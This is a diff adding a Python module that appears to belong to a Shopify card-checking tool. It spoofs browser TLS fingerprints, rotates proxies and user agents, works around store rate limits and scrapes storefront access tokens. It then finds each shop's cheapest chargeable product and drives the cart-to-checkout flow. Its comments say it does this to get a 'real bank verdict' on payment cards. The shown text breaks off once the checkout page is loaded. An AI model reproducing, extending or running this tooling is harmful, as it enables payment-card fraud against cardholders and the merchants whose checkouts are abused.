@@ -1,0 +1,2116 @@
+from __future__ import annotations
+
+import asyncio
+import json
+import re
+import html
+import random
+import os
+import urllib.parse
+import time as _time
+
+from curl_cffi.requests import AsyncSession
+
+import importlib.util
+from pathlib import Path
+
+_here = Path(__file__).resolve().parent
+_auto_path = _here / "auto.py"
+if not _auto_path.is_file():
+    _auto_path = _here.parent / "auto.py"
+_spec = importlib.util.spec_from_file_location("shopify_auto", _auto_path)
+_auto = importlib.util.module_from_spec(_spec)
+assert _spec.loader is not None
+_spec.loader.exec_module(_auto)
+
+CheckStatus = _auto.CheckStatus
+CheckResult = _auto.CheckResult
+Address = _auto.Address
+BROWSER_PROFILES = _auto.BROWSER_PROFILES
+USER_AGENTS = _auto.USER_AGENTS
+generate_random_email = _auto.generate_random_email
+address_for_country = _auto.address_for_country
+get_fallback_addresses = _auto.get_fallback_addresses
+parse_card_entry = _auto.parse_card_entry
+normalize_proxy = _auto.normalize_proxy
+extract_stable_id = _auto.extract_stable_id
+extract_commit_sha = _auto.extract_commit_sha
+extract_source_token = _auto.extract_source_token
+extract_private_access_token_id = _auto.extract_private_access_token_id
+extract_actions_js_url = _auto.extract_actions_js_url
+extract_proposal_id = _auto.extract_proposal_id
+extract_submit_for_completion_id = _auto.extract_submit_for_completion_id
+extract_queue_token = _auto.extract_queue_token
+extract_seller_currency = _auto.extract_seller_currency
+extract_seller_country = _auto.extract_seller_country
+extract_seller_merchandise_price = _auto.extract_seller_merchandise_price
+extract_is_shipping_required = _auto.extract_is_shipping_required
+extract_delivery_handle = _auto.extract_delivery_handle
+extract_signed_handles = _auto.extract_signed_handles
+extract_shipping_amount = _auto.extract_shipping_amount
+extract_checkout_total = _auto.extract_checkout_total
+extract_seller_total = _auto.extract_seller_total
+extract_running_total = _auto.extract_running_total
+extract_tax_amount = _auto.extract_tax_amount
+extract_identification_signature = _auto.extract_identification_signature
+extract_pci_session_id = _auto.extract_pci_session_id
+extract_receipt_id = _auto.extract_receipt_id
+extract_receipt_session_token = _auto.extract_receipt_session_token
+extract_receipt_status_code = _auto.extract_receipt_status_code
+extract_any_error = _auto.extract_any_error
+extract_flow_error = _auto.extract_flow_error
+extract_payment_flexibility_template = _auto.extract_payment_flexibility_template
+extract_tax_from_rejected = _auto.extract_tax_from_rejected
+extract_total_from_rejected = _auto.extract_total_from_rejected
+extract_rejected_totals = _auto.extract_rejected_totals
+extract_pending_poll_delay = _auto.extract_pending_poll_delay
+CURRENCY_TO_COUNTRY = _auto.CURRENCY_TO_COUNTRY
+_RE_CURRENCY_CART = _auto._RE_CURRENCY_CART
+extract_gateway_name = _auto.extract_gateway_name
+extract_delivery_from_proposal = _auto.extract_delivery_from_proposal
+_proposal_headers = _auto._proposal_headers
+patch_payload = _auto.patch_payload
+check_submit_errors = _auto.check_submit_errors
+generate_attempt_token = _auto.generate_attempt_token
+generate_page_id = _auto.generate_page_id
+
+# ── Async TLS client ──────────────────────────────────────────────────
+
+class AsyncTLSClient:
+    def __init__(self, timeout=20, proxy_url=None, impersonate=None, user_agent=None):
+        self.timeout     = timeout
+        self.proxy_url   = proxy_url
+        self.impersonate = impersonate
+        if self.impersonate is None:
+            self.impersonate = random.choice(["chrome124", "chrome120", "chrome116", "edge101", "safari15_5"])
+        self.user_agent  = user_agent or random.choice(USER_AGENTS)
+        self._lang  = "en-US,en;q=0.9"
+        self._session: AsyncSession | None = None
+
+    def _make_session(self) -> AsyncSession:
+        headers = {
+            'User-Agent':                self.user_agent,
+            'Accept-Language':           self._lang,
+            'Accept-Encoding':           'gzip, deflate, br',
+            'Accept':                    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Connection':                'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Dest':            'document',
+            'Sec-Fetch-Mode':            'navigate',
+            'Sec-Fetch-Site':            'none',
+            'Sec-Fetch-User':            '?1',
+            'Cache-Control':             'max-age=0',
+        }
+        s = AsyncSession(impersonate=self.impersonate, timeout=self.timeout)
+        s.headers.update(headers)
+        if self.proxy_url:
+            s.proxies = {'http': self.proxy_url, 'https': self.proxy_url}
+        return s
+
+    async def __aenter__(self):
+        self._session = self._make_session()
+        return self
+
+    async def __aexit__(self, *args):
+        await self.close()
+
+    async def get(self, url, **kwargs):
+        kwargs.setdefault('timeout', self.timeout)
+        retry429 = kwargs.pop('retry429', 0)
+        if self._session is None:
+            self._session = self._make_session()
+        last = None
+        for attempt in range(retry429 + 1):
+            try:
+                resp = await self._session.get(url, **kwargs)
+            except Exception as e:
+                last = e
+                if attempt < retry429:
+                    await asyncio.sleep(0.6 * (2 ** attempt) + random.uniform(0, 0.3))
+                    continue
+                raise
+            if resp.status_code in (429, 503) and attempt < retry429:
+                last = resp
+                delay = 1.0 * (2 ** attempt)
+                try:
+                    if resp.headers.get("Retry-After"):
+                        delay = min(float(resp.headers["Retry-After"]), 30.0)
+                except (TypeError, ValueError):
+                    pass
+                await asyncio.sleep(delay * random.uniform(0.8, 1.2))
+                continue
+            return resp
+        return last
+
+    async def post(self, url, data=None, json=None, **kwargs):
+        kwargs.setdefault('timeout', self.timeout)
+        retry429 = kwargs.pop('retry429', 0)
+        if self._session is None:
+            self._session = self._make_session()
+        last = None
+        for attempt in range(retry429 + 1):
+            try:
+                resp = await self._session.post(url, data=data, json=json, **kwargs)
+            except Exception as e:
+                last = e
+                if attempt < retry429:
+                    await asyncio.sleep(0.6 * (2 ** attempt) + random.uniform(0, 0.3))
+                    continue
+                raise
+            if resp.status_code in (429, 503) and attempt < retry429:
+                last = resp
+                delay = 1.0 * (2 ** attempt)
+                try:
+                    if resp.headers.get("Retry-After"):
+                        delay = min(float(resp.headers["Retry-After"]), 30.0)
+                except (TypeError, ValueError):
+                    pass
+                await asyncio.sleep(delay * random.uniform(0.8, 1.2))
+                continue
+            return resp
+        return last
+
+    async def close(self):
+        if self._session is not None:
+            await self._session.close()
+            self._session = None
+
+
+# ── Step 0: cheapest product ──────────────────────────────────────────
+# Catalog cache: shop/domain -> (cheapest_product_tuple, timestamp).
+# Once populated, repeated requests for the same shop reuse this result
+# instead of re-scanning /products.json until the TTL expires.
+_product_cache: dict = {}
+_product_cache_lock = __import__("threading").Lock()
+_CACHE_TTL = 1800                          # 30 min catalog cache
+
+# Negative / rate-limit cache: shop/domain -> (cooldown_until_ts, retry_after)
+_catalog_rate_limit: dict = {}
+# Per-shop single-flight: shop/domain -> asyncio.Future (result or (ok, value))
+_catalog_scans: dict = {}
+_catalog_scan_lock = __import__("threading").Lock()
+
+# Configurable catalog-fetching knobs
+_CATALOG_MAX_PAGES = 50                    # hard cap on scanned pages
+_CATALOG_BATCH = 3                         # concurrent pages per pacing wave
+_CATALOG_MAX_RETRIES = 2                   # 429 retries per catalog page
+_CATALOG_MAX_BACKOFF = 8.0                 # s, cap for exponential backoff
+_CATALOG_JITTER = 0.4                      # ±40% jitter on delays
+_CATALOG_RATELIMIT_COOLDOWN = 60           # s, temporary per-shop cooldown
+_CATALOG_WARMUP = True                     # homepage warm-up before scanning
+_CATALOG_DIRECT_FALLBACK = True            # proxy-429/blocked -> direct public catalog read
+_MIN_CHECKOUT_AMOUNT = 0.01                # skip prices below this (avoid TOO_LOW_AMOUNT)
+_CATALOG_GRAPHQL_FALLBACK = True           # storefront GraphQL as a fallback
+_CATALOG_GRAPHQL_FIRST = False             # direct first (fast/reliable), GraphQL when /products.json is throttled
+_CATALOG_GRAPHQL_VERSION = "2024-07"
+_CATALOG_GRAPHQL_PAGE = 250
+_CATALOG_GRAPHQL_TIMEOUT = 5                # s, per GraphQL request (fail fast)
+_CATALOG_GRAPHQL_BLOCK_TTL = 600            # s, skip GraphQL after "unavailable"
+_GRAPHQL_TOKENS = ("public_storefront", "public", "")
+_graphql_token_cache: dict = {}            # shop_url -> discovered token
+_graphql_blocked: dict = {}                # shop_url -> blocked_until_ts
+
+# Persistent proxy-less client used ONLY for public /products.json reads
+# (a fallback when the caller's proxy is exhausted; checkout still uses the proxy)
+_catalog_direct_client: "AsyncTLSClient | None" = None
+
+
+class _CatalogRateLimited(Exception):
+    """Raised when the catalog stays rate-limited after exhausting retries."""
+    def __init__(self, shop_url, retry_after=None):
+        self.shop_url = shop_url
+        self.retry_after = retry_after
+        super().__init__(f"catalog rate limited (HTTP 429): {shop_url}")
+
+
+def calculate_backoff(attempt: int, retry_after: str | float | None = None) -> float:
+    """Return a delay (s) for 429 handling.
+    Honors Retry-After when Shopify provides it, otherwise uses exponential
+    backoff with random jitter, capped at a maximum delay to prevent storms.
+    """
+    delay = min(1.0 * (2.0 ** attempt), _CATALOG_MAX_BACKOFF)
+    if retry_after is not None:
+        try:
+            delay = float(retry_after)
+            if delay > 0:
+                delay = min(delay, 120.0)   # never wait absurdly long
+        except (TypeError, ValueError):
+            pass
+    if delay <= 0:
+        delay = 0.5
+    return max(0.2, delay * random.uniform(1 - _CATALOG_JITTER, 1 + _CATALOG_JITTER))
+
+
+async def warm_up_catalog_session(client: AsyncTLSClient, shop_url: str):
+    """Lightweight warm-up: hits the storefront homepage with the same TLS
+    browser session used for the catalog scan so the session is initialized
+    and cookies are set before /products.json is requested."""
+    if not _CATALOG_WARMUP:
+        return
+    try:
+        await client.get(f"{shop_url}/", timeout=10)
+    except Exception:
+        pass
+
+
+def _no_products_error(shop_url: str, min_price: float, max_price: float) -> Exception:
+    if max_price == float('inf'):
+        return Exception(f"No available products at {shop_url}")
+    return Exception(f"No available products between ${min_price:.2f} and ${max_price:.2f} at {shop_url}")
+
+
+async def _fetch_catalog_page(client: AsyncTLSClient, shop_url: str, page: int, limit: int):
+    """Fetch one /products.json page with 429 retry/backoff on the same session.
+    Returns (status, products). status 429 means the retry budget was exhausted.
+    """
+    url = f"{shop_url}/products.json?limit={limit}&page={page}"
+    status = None
+    for attempt in range(_CATALOG_MAX_RETRIES + 1):
+        try:
+            resp = await client.get(url, timeout=15)
+            status = resp.status_code
+        except Exception:
+            return None, None                  # transient transport error
+        if status == 429:
+            try:
+                retry_after = resp.headers.get("Retry-After")
+            except Exception:
+                retry_after = None
+            delay = calculate_backoff(attempt, retry_after)
+            await asyncio.sleep(delay)
+            continue
+        if status != 200:
+            return status, None
+        try:
+            return 200, resp.json().get("products", [])
+        except Exception:
+            return 200, None
+    return 429, None
+
+
+def _get_catalog_direct_client() -> "AsyncTLSClient":
+    """Lazily build one persistent no-proxy client reused for catalog reads."""
+    global _catalog_direct_client
+    with _catalog_scan_lock:
+        if _catalog_direct_client is None:
+            _catalog_direct_client = AsyncTLSClient(timeout=15, proxy_url=None,
+                                                    impersonate=None, user_agent=None)
+        return _catalog_direct_client
+
+
+# Hard-junk / non-item variants that can NEVER produce a real charge (they are
+# $0.00 freebies or stand-ins Shopify never sends to the bank):
+#   * $0.00 "Virtual Desktop / free gift" variants
+#   * gift-wrap / donation / refund / discount-code / tax chatter
+# Picking these yields GENERIC_ERROR / AMOUNT_TOO_SMALL / TOO_LOW_AMOUNT and
+# hides the real card verdict, so the cheap-product picker must skip them.
+# NOTE: "Price Gap Payment Link - Make up...", "shipping difference" links etc.
+# ARE chargeable (they run a real $x checkout: fezibo $1.00 gap link charges
+# like a real product) → they are NOT junk and stay candidates.
+_HARD_JUNK_TITLE_MARKERS = (
+    "virtual desktop", "virtual product", "gift wrap", "gift wrapping",
+    "donation", "refund", "discount code", "coupon code", "tax", "duties",
+    "customs", "tip for", "tip &", "wrapping", "shipping protection",
+    "global-e", "which one apply to",
+)
+
+# Products below this price are rejected by Shopify as TOO_LOW_AMOUNT /
+# AMOUNT_TOO_SMALL on most stores, so never auto-pick them. Real chargeable
+# sub-$1 items (gaps, links) sit at >= $0.10..$0.50 and are kept.
+_PICK_FLOOR = 0.10
+
+def _is_junk_product(title: str) -> bool:
+    t = (title or "").lower()
+    return any(m in t for m in _HARD_JUNK_TITLE_MARKERS)
+
+def _catalog_pick(products, best_price, best_product, min_price, max_price, exclude=None):
+    """Existing cheapest-product filtering and selection (unchanged), except
+    hard-junk non-item variants (virtual/gift/refund stand-ins, $0.00 freebies)
+    and sub-_PICK_FLOOR amounts are skipped so the store returns a real bank
+    verdict instead of GENERIC_ERROR / AMOUNT_TOO_SMALL."""
+    def _pick(p):
+        if exclude and str(p.get("id", "")) in exclude:
+            return True
+        return False
+
+    lower = max(min_price, _PICK_FLOOR)
+    for p in products or []:
+        if _is_junk_product(p.get("title", "")) or _pick(p):
+            continue
+        for v in p.get("variants", []):
+            if not v.get("available", False):
+                continue
+            try:
+                price = float(v.get("price") or 0)
+            except (ValueError, TypeError):
+                continue
+            if price < lower or price > max_price or price <= 0:
+                continue
+            if price < best_price:
+                best_price = price
+                best_product = (
+                    p.get("title", ""),
+                    str(p.get("id", "")),
+                    p.get("handle", ""),
+                    str(v.get("id", "")),
+                    v.get("price", "")
+                )
+    return best_price, best_product
+
+
+async def _scan_catalog_direct(shop_url: str, min_price: float, max_price: float, exclude=None):
+    """Proxy-less scan of the public /products.json used as a fallback when the
+    proxied catalog is rate-limited/blocked. Reads public product data only;
+    checkout still runs through the caller's proxy."""
+    client = _get_catalog_direct_client()
+    limit = 250
+    best_price = float('inf')
+    best_product = None
+
+    p1_status, page1 = await _fetch_catalog_page(client, shop_url, 1, limit)
+    if p1_status == 429:
+        raise _CatalogRateLimited(shop_url)
+    if page1 is None:
+        if p1_status == 200:
+            page1 = []                       # decode failure -> treat as empty
+        else:
+            raise Exception(f"No available products at {shop_url} (catalog blocked: HTTP {p1_status})")
+
+    best_price, best_product = _catalog_pick(page1, best_price, best_product, min_price, max_price, exclude)
+    if len(page1) < limit or not page1:
+        if best_product is None:
+            raise _no_products_error(shop_url, min_price, max_price)
+        return best_product
+
+    next_page = 2
+    total_pages = _CATALOG_MAX_PAGES
+    while next_page <= total_pages:
+        end = min(next_page + _CATALOG_BATCH - 1, total_pages)
+        await asyncio.sleep(random.uniform(0.05, 0.3))
+        batch = await asyncio.gather(*[_fetch_catalog_page(client, shop_url, p, limit)
+                                       for p in range(next_page, end + 1)])
+        rate_limited = False
+        for p, (st, products) in zip(range(next_page, end + 1), batch):
+            if st == 429:
+                rate_limited = True
+                continue
+            if products is None:
+                continue
+            best_price, best_product = _catalog_pick(products, best_price, best_product, min_price, max_price, exclude)
+            if len(products) < limit or not products:
+                if best_product is None:
+                    raise _no_products_error(shop_url, min_price, max_price)
+                return best_product
+        if rate_limited:
+            if best_product is None:
+                raise _CatalogRateLimited(shop_url)
+            return best_product
+        next_page = end + 1
+
+    if best_product is None:
+        raise _no_products_error(shop_url, min_price, max_price)
+    return best_product
+
+
+# ── Storefront GraphQL fallback ────────────────────────────────────────
+
+_GRAPHQL_PRODUCTS_QUERY = """query ($cursor: String, $count: Int!) {
+  products(first: $count, after: $cursor) {
+    pageInfo { hasNextPage endCursor }
+    edges { node {
+      id title handle
+      variants(first: 100) {
+        pageInfo { hasNextPage }
+        edges { node { id availableForSale price { amount currencyCode } } }
+      }
+    } }
+  }
+}"""
+
+
+def _gid_numeric(gid):
+    """Extract the numeric id from a Shopify gid:// node ID."""
+    if not gid:
+        return ""
+    try:
+        return str(gid).rsplit("/", 1)[-1]
+    except Exception:
+        return ""
+
+
+def _graphql_edges_to_products(data):
+    """Convert a Storefront GraphQL products response to the same product-dict
+    structure used by /products.json so _catalog_pick can consume it unchanged."""
+    products = []
+    for e in ((data.get("data") or {}).get("products") or {}).get("edges") or []:
+        n = e.get("node") or {}
+        variants = []
+        for ve in (n.get("variants") or {}).get("edges") or []:
+            vn = ve.get("node") or {}
+            variants.append({
+                "id":       _gid_numeric(vn.get("id")),
+                "price":    str(((vn.get("price") or {}).get("amount")) or "0"),
+                "available": bool(vn.get("availableForSale")),
+            })
+        products.append({
+            "title":    n.get("title", ""),
+            "id":       _gid_numeric(n.get("id")),
+            "handle":   n.get("handle", ""),
+            "variants": variants,
+        })
+    return products
+
+
+async def _discover_storefront_token(client: AsyncTLSClient, shop_url: str):
+    """Try to extract the storefront GraphQL access token embedded in the
+    storefront HTML (headless/Hydrogen themes publish it). Returns None when
+    the store does not expose one."""
+    try:
+        resp = await client.get(f"{shop_url}/", timeout=15)
+        if resp.status_code != 200:
+            return None
+        html = resp.text or ""
+    except Exception:
+        return None
+    for pat in (r"storefrontAccessToken[^A-Za-z0-9]*['\"]([A-Za-z0-9]+)",
+                r"X-Shopify-Storefront-Access-Token[^A-Za-z0-9]*['\"]([A-Za-z0-9]+)",
+                r"['\"]accessToken['\"]\s*:\s*['\"]([A-Za-z0-9]{10,})"):
+        m = re.search(pat, html)
+        if m:
+            return m.group(1)
+    return None
+
+
+async def _storefront_products(client: AsyncTLSClient, shop_url: str, max_pages: int):
+    """Paginate the storefront GraphQL catalog, trying known tokens and
+    reusing any previously discovered valid token. Returns all products as
+    the pseudo product-dict list that _catalog_pick expects."""
+    base_url = f"{shop_url}/api/{_CATALOG_GRAPHQL_VERSION}/graphql.json"
+    token = _graphql_token_cache.get(shop_url)
+    all_products: list[dict] = []
+    cursor = None
+
+    for page_num in range(1, max_pages + 1):
+        payload = {"query": _GRAPHQL_PRODUCTS_QUERY,
+                   "variables": {"count": _CATALOG_GRAPHQL_PAGE, "cursor": cursor}}
+
+        ok = False
+        tokens_to_try = []
+        if token:
+            tokens_to_try.append(token)
+        if not tokens_to_try:
+            found = await _discover_storefront_token(client, shop_url)
+            if found:
+                tokens_to_try.append(found)
+        for t in _GRAPHQL_TOKENS:
+            if t and t not in tokens_to_try:
+                tokens_to_try.append(t)
+        for t in tokens_to_try:
+            if not t:
+                continue
+            try:
+                resp = await client.post(base_url, json=payload,
+                                         headers={"Content-Type": "application/json",
+                                                   "X-Shopify-Storefront-Access-Token": t,
+                                                   "Accept": "application/json"},
+                                         timeout=_CATALOG_GRAPHQL_TIMEOUT)
+            except Exception:
+                continue
+            if resp.status_code == 404:
+                _graphql_blocked[shop_url] = _time.time() + _CATALOG_GRAPHQL_BLOCK_TTL
+                raise Exception(f"storefront graphql unavailable for {shop_url}")
+            if resp.status_code != 200:
+                continue
+            try:
+                data = resp.json()
+            except Exception:
+                continue
+            errors = (data.get("errors") or [])
+            if any("access token" in (e.get("message", "")).lower() for e in errors):
+                continue
+            ok = True
+            token = t                       # cache the working token
+            _graphql_token_cache[shop_url] = t
+            break
+        if not ok:
+            _graphql_blocked[shop_url] = _time.time() + _CATALOG_GRAPHQL_BLOCK_TTL
+            raise Exception(f"storefront graphql unavailable for {shop_url}")
+
+        page_products = _graphql_edges_to_products(data)
+        if page_products:
+            all_products += page_products
+
+        page_info = (((data.get("data") or {}).get("products") or {}).get("pageInfo") or {})
+        if not page_info.get("hasNextPage"):
+            break
+        cursor = page_info.get("endCursor")
+        await asyncio.sleep(random.uniform(0.05, 0.2))
+
+    return all_products
+
+
+async def _scan_catalog_graphql(shop_url: str, min_price: float, max_price: float, exclude=None):
+    """Storefront GraphQL catalog scan (no /products.json, no 429 on that path).
+    Returns the cheapest available product using the same _catalog_pick logic."""
+    client = _get_catalog_direct_client()
+    all_products = await _storefront_products(client, shop_url, _CATALOG_MAX_PAGES)
+
+    best_price = float('inf')
+    best_product = None
+    best_price, best_product = _catalog_pick(all_products, best_price, best_product, min_price, max_price, exclude)
+    if best_product is None:
+        raise _no_products_error(shop_url, min_price, max_price)
+    return best_product
+
+
+async def _scan_catalog(client: AsyncTLSClient, shop_url: str,
+                        min_price: float, max_price: float, exclude=None):
+    """Full catalog scan: warms the session, fetches page 1 first, then walks
+    the remaining pages in small paced batches on the same session. Stops on
+    the last (short/empty) page, the page cap, or persistent 429. When the
+    caller's proxy itself is rate-limited/blocked, falls back first to the
+    storefront GraphQL catalog, then to a direct public products.json read
+    (checkout still uses the proxy)."""
+    await warm_up_catalog_session(client, shop_url)
+
+    async def _try_fallback():
+        if not _CATALOG_DIRECT_FALLBACK:
+            raise _CatalogRateLimited(shop_url)
+
+        graphql_ok = (_CATALOG_GRAPHQL_FALLBACK
+                      and _graphql_blocked.get(shop_url, 0) < _time.time())
+
+        if _CATALOG_GRAPHQL_FIRST and graphql_ok:
+            try:
+                return await _scan_catalog_graphql(shop_url, min_price, max_price, exclude)
+            except Exception:
+                pass          # GraphQL is only an optional probe; never block here
+
+        try:
+            return await _scan_catalog_direct(shop_url, min_price, max_price, exclude)
+        except _CatalogRateLimited as e:
+            # /products.json is genuinely throttled: GraphQL (separate endpoint)
+            # may still answer, before giving up.
+            if graphql_ok:
+                try:
+                    return await _scan_catalog_graphql(shop_url, min_price, max_price, exclude)
+                except Exception:
+                    pass
+            raise e
+
+    limit = 250
+    best_price = float('inf')
+    best_product = None
+
+    # Page 1 always fetched first (and alone).
+    p1_status, page1 = await _fetch_catalog_page(client, shop_url, 1, limit)
+    if p1_status == 429:
+        return await _try_fallback()
+    if page1 is None:
+        if p1_status == 200:
+            page1 = []                       # decode failure -> treat as empty
+        else:
+            if _CATALOG_DIRECT_FALLBACK:
+                return await _try_fallback()
+            raise Exception(f"No available products at {shop_url} (catalog blocked: HTTP {p1_status})")
+
+    best_price, best_product = _catalog_pick(page1, best_price, best_product, min_price, max_price, exclude)
+
+    # Single-page catalog (or page 1 was the last page): done.
+    if len(page1) < limit or not page1:
+        if best_product is None:
+            raise _no_products_error(shop_url, min_price, max_price)
+        return best_product
+
+    # Multiple pages: walk in small paced batches; no /products/count.json.
+    next_page = 2
+    total_pages = _CATALOG_MAX_PAGES
+    while next_page <= total_pages:
+        end = min(next_page + _CATALOG_BATCH - 1, total_pages)
+        await asyncio.sleep(random.uniform(0.1, 0.5))   # pacing/jitter between batches
+        batch = await asyncio.gather(*[_fetch_catalog_page(client, shop_url, p, limit)
+                                       for p in range(next_page, end + 1)])
+        rate_limited = False
+        any_success = False
+        for p, (st, products) in zip(range(next_page, end + 1), batch):
+            if st == 429:
+                rate_limited = True
+                continue
+            if products is None:
+                continue
+            any_success = True
+            best_price, best_product = _catalog_pick(products, best_price, best_product, min_price, max_price, exclude)
+            if len(products) < limit or not products:
+                # Reached the real last catalog page.
+                if best_product is None:
+                    raise _no_products_error(shop_url, min_price, max_price)
+                return best_product
+        if rate_limited:
+            # Persistent 429 within the batch: stop requesting more pages.
+            if best_product is None:
+                return await _try_fallback()
+            return best_product
+        if not any_success:
+            # Entire batch failed (network/non-200): stop pagination.
+            if best_product is None and _CATALOG_DIRECT_FALLBACK:
+                return await _try_fallback()
+            break
+        next_page = end + 1
+
+    if best_product is None:
+        raise _no_products_error(shop_url, min_price, max_price)
+    return best_product
+
+
+async def find_cheapest_product(client: AsyncTLSClient, shop_url: str,
+                                min_price: float = 0.01, max_price: float | None = None,
+                                exclude=None):
+    """Cheapest available product, backed by a per-shop catalog cache,
+    single-flight scanning, warmed session reuse, pacing and 429 backoff.
+    `exclude` is a set of product ids forced to be skipped (used when a
+    previously picked product turned out to be unshippable / local-only)."""
+    if max_price is None:
+        max_price = float('inf')
+
+    now = _time.time()
+    with _product_cache_lock:
+        cached = _product_cache.get(shop_url)
+        cache_hit = bool(cached and now - cached[-1] < _CACHE_TTL)
+        rl = _catalog_rate_limit.get(shop_url)
+        if rl and now < rl[0]:
+            if cached:                       # serve known-best during cooldown
+                return cached[:-1]
+            raise Exception(f"No available products at {shop_url} (catalog temporarily unavailable)")
+
+    # If the cached best is excluded, we must bypass the cache and re-scan
+    # (the whole point of exclusion is to pick the next-cheapest product).
+    if cache_hit:
+        cached_best = cached[:-1]
+        if not exclude or str(cached_best[1]) not in exclude:
+            return cached_best
+        try:
+            return await _scan_catalog(client, shop_url, min_price, max_price, exclude=exclude)
+        except Exception:
+            raise Exception(f"No available products at {shop_url} after excluding {sorted(exclude)}")
+
+    # Per-shop single-flight: only one catalog scan per shop at a time.
+    joining = False
+    with _catalog_scan_lock:
+        fut = _catalog_scans.get(shop_url)
+        if fut is not None and not fut.done():
+            joining = True
+        else:
+            fut = asyncio.get_running_loop().create_future()
+            _catalog_scans[shop_url] = fut
+    if joining:
+        ok, val = await asyncio.shield(fut)
+        if ok:
+            return val
+        raise val
+
+    try:
+        try:
+            result = await _scan_catalog(client, shop_url, min_price, max_price, exclude=exclude)
+        except _CatalogRateLimited as e:
+            cooldown = _CATALOG_RATELIMIT_COOLDOWN
+            if e.retry_after:
+                try:
+                    cooldown = max(cooldown, float(e.retry_after))
+                except (TypeError, ValueError):
+                    pass
+            with _product_cache_lock:
+                _catalog_rate_limit[shop_url] = (_time.time() + cooldown, e.retry_after)
+                cached = _product_cache.get(shop_url)
+            if cached:
+                result = cached[:-1]         # reuse known result during cooldown
+            else:
+                err = Exception(f"No available products at {shop_url} (catalog temporarily unavailable)")
+                fut.set_result((False, err))
+                raise err
+        else:
+            with _product_cache_lock:
+                _product_cache[shop_url] = result + (_time.time(),)
+        fut.set_result((True, result))
+        return result
+    except asyncio.CancelledError:
+        if not fut.done():
+            fut.set_result((False, asyncio.CancelledError("catalog scan cancelled")))
+        raise
+    except Exception as e:
+        if not fut.done():
+            fut.set_result((False, e))
+        raise
+    finally:
+        with _catalog_scan_lock:
+            if _catalog_scans.get(shop_url) is fut:
+                _catalog_scans.pop(shop_url, None)
+
+
+# ── Currency detection (mirrors app.go fetchCurrency) ────────────────
+
+async def fetch_shop_currency(client: AsyncTLSClient, shop_url: str) -> tuple:
+    """
+    Detect shop currency and resolve its country code.
+    Tries /meta.json → /cart.js → fallback "USD"/"US".
+    """
+    def _apply(cur):
+        return cur, CURRENCY_TO_COUNTRY.get(cur, "US")
+
+    for path in ("/meta.json", "/cart.js"):
+        try:
+            resp = await client.get(f"{shop_url}{path}", timeout=10)
+            if resp and resp.status_code == 200:
+                if path == "/meta.json":
+                    try:
+                        cur = str((resp.json().get("currency") or "")).strip().upper()
+                    except Exception:
+                        cur = ""
+                else:
+                    m = _RE_CURRENCY_CART.search(resp.text)
+                    cur = m.group(1).upper() if m else ""
+                if len(cur) == 3:
+                    return _apply(cur)
+        except Exception:
+            continue
+    return "USD", "US"
+
+
+# ── Step 1: cart → checkout ───────────────────────────────────────────
+
+_PAGE_HEADERS = {
+    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+    "accept-language": "en-US,en;q=0.9,en-IN;q=0.8",
+    "cache-control": "no-cache",
+    "pragma": "no-cache",
+    "sec-ch-ua": '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
+    "sec-ch-ua-mobile": "?0",
+    "sec-ch-ua-platform": '"Windows"',
+    "sec-fetch-dest": "document",
+    "sec-fetch-mode": "navigate",
+    "sec-fetch-site": "none",
+    "sec-fetch-user": "?1",
+    "upgrade-insecure-requests": "1",
+}
+
+
+async def add_to_cart_and_checkout(client: AsyncTLSClient, shop_url: str,
+                                   variant_id: str, product_id: str, product_handle: str):
+    cart_permalink = f"{shop_url}/cart/{variant_id}:1"
+    checkout_resp  = await client.get(cart_permalink, allow_redirects=True, retry429=2, headers={
+        **_PAGE_HEADERS,
+        "user-agent": client.user_agent,
+        "referer":    shop_url + "/",
+        "sec-fetch-site": "same-origin",
+    })
+
+    # Some stores 403 the first permalink hit but accept a retry (fresh session
+    # still set). One extra attempt before falling back to the add.js flow.
+    if checkout_resp.status_code in (403, 410):
+        await asyncio.sleep(random.uniform(0.4, 1.0))
+        try:
+            retried = await client.get(cart_permalink, allow_redirects=True, retry429=2, headers={
+                **_PAGE_HEADERS,
+                "user-agent": client.user_agent,
+                "referer":    shop_url + "/",
+                "sec-fetch-site": "same-origin",
+            })
+            if retried.status_code in (200, 302):
+                checkout_resp = retried
+        except Exception:
+            pass
+
+    if checkout_resp.status_code not in (200, 302):
+        # Fallback: some stores block the direct permalink (403/410) but accept
+        # the normal add-to-cart then cart update flow.
+        try:
+            add_headers = {
+                **_PAGE_HEADERS,
+                "user-agent":        client.user_agent,
+                "referer":           cart_permalink,
+                "origin":            shop_url,
+                "accept":            "application/json, text/javascript, */*; q=0.01",
+                "content-type":      "application/json",
+                "x-requested-with":  "XMLHttpRequest",
+                "sec-fetch-dest":    "empty",
+                "sec-fetch-mode":    "cors",
+                "sec-fetch-site":    "same-origin",
+            }
+            add_resp = await client.post(
+                f"{shop_url}/cart/add.js",
+                json={"id": int(variant_id), "quantity": 1},
+                headers=add_headers, retry429=2, timeout=12)
+            cart_token = ""
+            if add_resp.status_code in (200, 201):
+                try:
+                    cart_token = (add_resp.json() or {}).get("token", "") or ""
+                except Exception:
+                    cart_token = ""
+            if not cart_token and (add_resp.status_code in (200, 201)):
+                try:
+                    cart_js_resp = await client.get(
+                        f"{shop_url}/cart.js",
+                        headers={
+                            **_PAGE_HEADERS,
+                            "user-agent": client.user_agent,
+                            "referer":    f"{shop_url}/cart",
+                            "accept":     "application/json, text/javascript, */*; q=0.01",
+                        }, timeout=12)
+                    if cart_js_resp.status_code == 200:
+                        try:
+                            cart_token = (cart_js_resp.json() or {}).get("token", "") or ""
+                        except Exception:
+                            cart_token = ""
+                except Exception:
+                    cart_token = ""
+            post_headers = {
+                **_PAGE_HEADERS,
+                "user-agent":        client.user_agent,
+                "referer":           f"{shop_url}/cart",
+                "origin":            shop_url,
+                "content-type":      "application/x-www-form-urlencoded",
+                "sec-fetch-site":    "same-origin",
+            }
+            cart_resp = await client.post(
+                f"{shop_url}/cart",
+                data=f"updates%5B%5D=1&checkout=&cart_token={cart_token}",
+                headers=post_headers, allow_redirects=True, retry429=2, timeout=12)
+            if cart_resp.status_code in (200, 302) and "/checkouts/" in cart_resp.url:
+                checkout_resp = cart_resp
+            else:
+                raise Exception(f"cart permalink returned {checkout_resp.status_code}")
+        except Exception:
+            raise Exception(f"cart permalink returned {checkout_resp.status_code}")
+
+    checkout_url  = checkout_resp.url
+    checkout_html = checkout_resp.text
+
